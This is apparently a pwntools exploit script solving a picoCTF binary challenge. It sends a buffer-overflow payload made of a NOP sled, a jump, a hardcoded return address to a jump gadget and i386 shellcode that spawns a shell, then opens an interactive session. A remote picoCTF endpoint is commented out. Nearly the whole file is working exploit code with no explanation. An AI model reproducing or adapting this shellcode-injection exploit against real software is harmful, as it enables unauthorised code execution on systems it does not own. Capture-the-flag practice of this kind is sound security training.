from pwn import *

elf = ELF("./attachment/vuln")
rop = ROP(elf)

io = process(elf.path, cwd="./attachment", level="DEBUG")
gdb.attach(io, "b *0x0805334b")
# io = remote("saturn.picoctf.net", 50294)

payload = b"".join([
    asm("nop\n" * 26 + "jmp $+0x06"),  # 28 bytes
    p32(0x0805334b),  # jmp rax
    asm(shellcraft.i386.linux.sh())
])

io.sendline(payload)
io.interactive()
